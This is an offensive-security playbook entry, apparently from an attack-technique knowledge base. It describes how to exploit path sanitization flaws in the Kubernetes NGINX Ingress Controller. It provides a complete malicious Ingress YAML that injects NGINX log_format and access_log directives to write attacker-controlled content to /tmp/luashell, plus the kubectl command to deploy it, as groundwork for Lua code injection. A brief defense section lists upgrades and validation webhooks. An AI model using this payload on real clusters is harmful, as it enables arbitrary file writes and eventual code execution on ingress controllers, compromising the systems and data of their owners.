---
id: proc-003
tags:
  - injection
  - nginx
  - file-write
type: procedure
tools:
  - '[[tools/kubectl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/kubectl-apply-write-ingress-yaml]]'
verified: false
platforms:
  - Kubernetes
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:23:49.943Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
---
# Create-Malicious-Ingress-for-File-Write

## Summary

This procedure creates an Ingress resource with a crafted path field that injects NGINX log_format and access_log directives, bypassing sanitizers to enable arbitrary file writing on the controller pod.

## Description

The vulnerability stems from poor sanitization in the path field, allowing closure of existing blocks and insertion of directives like log_format exploit escape=none $http_x_ginoah; and access_log /tmp/luashell exploit;. A backend to a non-existent service is used as a dummy. This sets up the mechanism to log custom headers to a file, which will contain injected Lua code.

## Requirements

1. Running NGINX Ingress Controller.
2. Permissions to create Ingress resources (default in Kind).
3. write_ingress.yaml file prepared with the malicious path.
4. Access to kubectl.

## Defense

Defensive measures and detection strategies:

- Upgrade to ingress-nginx version with fixed path sanitization (v1.1.1+).
- Implement Ingress validation webhooks to reject suspicious paths.
- Audit Ingress resources for unusual YAML structures.
- Monitor NGINX logs for unexpected log_format changes.

## Objectives

1. Inject NGINX config for custom logging.
2. Target /tmp/luashell for Lua code write.
3. Bypass invalidAliasDirective, invalidRootDirective, invalidByLuaDirective rules.
4. Prepare for Lua injection via HTTP.

## Instructions

### Step 1: Prepare Malicious YAML

**Context**: Create write_ingress.yaml with path injection: '/x/ {\n}\n}\n log_format exploit escape=none $http_x_ginoah;\n server {\n server_name x.x;\n listen 80;\n listen [::]:80;\n location /z/ {\n access_log /tmp/luashell exploit;\n}\n location /x/ {\n pathType: Exact backend: service: name: not-exist-service port: number:8080'.

No command; manually craft YAML:

```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: malicious-write
spec:
  rules:
  - host: x.x
    http:
      paths:
      - path: '/x/ {\n}\n}\n log_format exploit escape=none $http_x_ginoah;\n server {\n server_name x.x;\n listen 80;\n listen [::]:80;\n location /z/ {\n access_log /tmp/luashell exploit;\n}\n location /x/ {\n'
        pathType: Prefix
        backend:
          service:
            name: not-exist-service
            port:
              number: 8080
```

> Note the escaped newlines for injection.

### Step 2: Apply the Ingress

**Context**: Deploy the Ingress to trigger config generation in NGINX.

**Command** ([[commands/kubectl-apply-write-ingress-yaml]]):

```bash
kubectl apply -f write_ingress.yaml
```

> Expected output: "ingress.networking.k8s.io/malicious-write created".

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Unix Shell]] Unix Shell

### Sub-Techniques


## Commands Used

- [[commands/kubectl-apply-write-ingress-yaml]]

## Tools Used

- [[tools/kubectl]]

## Tags

- injection
- nginx
- file-write
